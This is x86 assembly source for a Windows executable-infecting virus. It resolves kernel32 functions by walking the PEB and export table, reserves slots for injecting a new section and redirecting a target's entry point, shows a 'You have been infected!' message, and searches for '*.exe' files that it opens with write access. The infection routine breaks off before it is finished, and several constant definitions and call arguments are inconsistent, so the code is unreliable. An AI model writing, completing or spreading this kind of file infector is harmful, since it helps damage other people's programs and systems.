include misc.inc

.code
old_entry:
    invoke ExitProcess, 0

.code inject
	data_start EQU $
	
	; .data
	strGMFN db 'GetModuleFileNameA', 0
    strF1A db 'FindFirstFileA', 0
    strFNA db 'FindNextFileA', 0
    strFC db 'FindClose', 0
    strCFA db 'CreateFileA', 0
    strSFP db 'SetFilePointerEx', 0
    strCH db 'CloseHandle', 0
    strRF db 'ReadFile', 0
    strWF db 'WriteFile', 0
    strLLA db 'LoadLibraryA', 0
    strGPA db 'GetProcAddress', 0
    stru32dll db 'user32.dll', 0
    strMBA db 'MessageBoxA', 0
    
    strQuery db '*.exe', 0
	strCaption db 'Notice', 0
    strContent db 'You have been infected!', 0
    
    ; .data?
    filePath db 260 DUP(0) ; filePath[MAX_PATH]
    win32FindData db 320 DUP(0) ; To store WIN32_FIND_DATAA
    
	; .const
	; Order of each variable IN THE STACK
	; Position relative to r|ebp calculated by -(Order * regSz)
    selfName EQU 11
	selfImageBaseAddress EQU 1
	selfSection EQU 2
	selfEntry EQU 3
	fileHand EQU 4 ; From FindFirstFile, for FindNextFile
	readHand EQU 4
	writeHand EQU 5
	
	tgImageBaseAddress EQU 1
    tgOldEntry EQU 2
    tgNewSection EQU 3
	tgNewEntry EQU 4
	
    kernel32dll EQU 5
    OrdinalTbl EQU 6
    NamePtrTbl EQU 7
    AddrTbl EQU 8
    k32NumFunc EQU 9
    user32dll EQU 10
    
    ffind1 EQU 12 		; FindFirstFileA
    ffind2 EQU 13 		; FindNextFileA
    ffind0 EQU 14 		; FindClose
    fopen EQU 11 		; CreateFileA
    fseek EQU 17 		; SetFilePointer(Ex)
    fclose EQU 14 		; CloseHandle
    fread EQU 15 		; ReadFile
    fwrite EQU 16 		; WriteFile
    argv0 EQU 17
    loadlib EQU 17 		; LoadLibraryA
    getaddr EQU 18 		; GetProcAddress
    msgbox EQU 19 		; MessageBoxA
    
    stack_reserved EQU 10 ; Number of values to be stored in the stack
    regSz EQU 4 ; 8 for 64-bit
    
    entrySectionOffset EQU $ - offset strCFA
    
; .code
start:
    call here
    here:
        
    mov ebp, esp
    
    mov eax, stack_reserved
    imul eax, regSz
    sub esp, eax
    
    mov edx, [ebp] ; selfEntry + 1 + 4
    sub edx, 5 ; eax = selfEntry
    toStack selfEntry, edx
    
    sub edx, entrySectionOffset
    toStack selfSection, edx
    
    ; Find kernel32.dll
    ASSUME FS:NOTHING
    mov ebx, fs:30h
    mov ebx, [ebx + 0Ch]
    mov ebx, [ebx + 14h]
    mov ebx, [ebx]
    mov ebx, [ebx]
    mov ebx, [ebx + 10h]
	toStack kernel32dll, ebx ; BaseAddress of kernel32.dll
    
    mov edi, [ebx + 3Ch]
    add edi, ebx
    mov edi, [edi + 78h] ; 24 (18h) + 96 (60h) = RVA of kernel32.dll Export Table
    add edi, ebx
    mov ecx, [edi + 24h]
    add ecx, ebx
    toStack OrdinalTbl, ecx ; VA of Ordinal Table
    
    mov esi, [edi + 20h]
    add esi, ebx
    toStack NamePtrTbl, esi ; VA of Name Pointer Table
    
    mov edx, [edi + 1Ch]
    add edx, ebx
    toStack AddrTbl, edx ; VA of Address Table
    
    mov edx, [edi + 14h]
    toStack k32NumFunc, edx
    
    k32import offset strF1A
    toStack ffind1
    
    k32import offset strFNA
    toStack ffind2
    
    k32import offset strFC
    toStack ffind0
    
    k32import offset strCFA
    toStack fopen
    
    k32import offset strSFP
    toStack fseek
    
    k32import offset strCH
    toStack fclose
    
    k32import offset strRF
    toStack fread
    
    k32import offset strWF
    toStack fwrite
    
    k32import offset strGMFN
    toStack argv0
    
    k32import offset strLLA
    toStack loadlib
    
   	push daccess(offset stru32dll)
   	call fromStack(loadlib)
    toStack user32dll
    
    k32import offset strGPA
    toStack getaddr
    
    push daccess(offset strMBA)
    push fromStack(user32dll)
    call fromStack(getaddr)
    toStack msgbox
    
    ; Get name of current process
    invoke fromStack(argv0),
    		0, 							; Current process
    		daccess(offset filePath), 	; To store output
    		260							; MAX_PATH
    
    ; Open current file for READing
    invoke fromStack(fopen),
    		40000000h, 		; GENERIC_READ
	    	0, 				; No sharing
	    	0,
	    	4,				; OPEN_ALWAYS
	    	80h, 			; FILE_ATTRIBUTE_NORMAL
	    	0
    
    ; Find first file in directory
    push daccess(offset win32FindData)
    push daccess(offset strQuery)
    call fromStack(ffind1)
    
    ; Open file
    push 0
    push 80h ; FILE_ATTRIBUTE_NORMAL
    push 4 ; OPEN_ALWAYS
    push 0
	push 0 ; No sharing
	push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
	push daccess(offset win32FindData) + 2Ch ; cFileName in WIN32_FIND_DATAA
	call fromStack(fopen)
	toStack writeHand
	
	
    
end start
